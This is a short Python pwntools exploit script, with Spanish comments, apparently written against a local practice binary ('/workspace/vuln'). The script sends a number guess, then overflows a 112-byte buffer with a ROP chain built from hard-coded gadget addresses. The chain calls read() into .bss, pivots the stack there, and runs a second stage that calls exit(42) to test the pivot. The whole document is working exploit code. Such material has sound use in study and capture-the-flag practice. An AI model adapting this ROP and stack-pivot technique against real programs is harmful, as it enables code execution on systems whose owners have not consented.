#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'warn'

# Gadgets
pop_rbx = 0x400ee8
pop_rsp_gadget = 0x45858b  # add byte ptr [rbx + 0x41], bl ; pop rsp ; ret
writable_addr = 0x6bc3a0
pop_rax = 0x4005af
pop_rdi = 0x4006a6
syscall = 0x40138c

# Probar localmente
io = process('/workspace/vuln')

io.recvuntil(b'What number would you like to guess?\n')
io.sendline(b'84')

io.recvuntil(b'Name? ')

# Payload simple: solo hacer stack pivot y ejecutar exit
payload = b'A' * 112
payload += b'B' * 8

# Primero poner el nuevo ROP chain en .bss+0x200
# Pero necesitamos primero escribirlo ahí...
# Vamos a usar un approach más simple: solo probar el pivot sin read previo

# Poner rbx apuntando a .bss (para que la escritura sea segura)
payload += p64(pop_rbx) + p64(writable_addr)

# Ahora hacer pivot a una dirección conocida donde sabemos que hay un ROP válido
# Vamos a pivotar a .bss+0x300 y escribir manualmente el ROP ahí antes

# De hecho, no puedo escribir en .bss antes de ejecutar el programa...
# Necesito hacerlo con read() primero

# OK volvamos al plan original
payload += p64(pop_rax) + p64(0)  # sys_read
payload += p64(pop_rdi) + p64(0)  # stdin
payload += p64(0x44c9a9) + p64(50) + p64(writable_addr + 0x300)  # pop rdx ; pop rsi
payload += p64(syscall)

# Stack pivot
payload += p64(pop_rsp_gadget) + p64(writable_addr + 0x300)

io.sendline(payload)

# Enviar stage 2: simple exit(42)
sleep(0.3)
stage2 = p64(pop_rax) + p64(60) + p64(pop_rdi) + p64(42) + p64(syscall)
io.send(stage2)

# Ver resultado
sleep(0.5)
exit_code = io.poll(block=True)
print(f"Exit code: {exit_code}")

io.close()
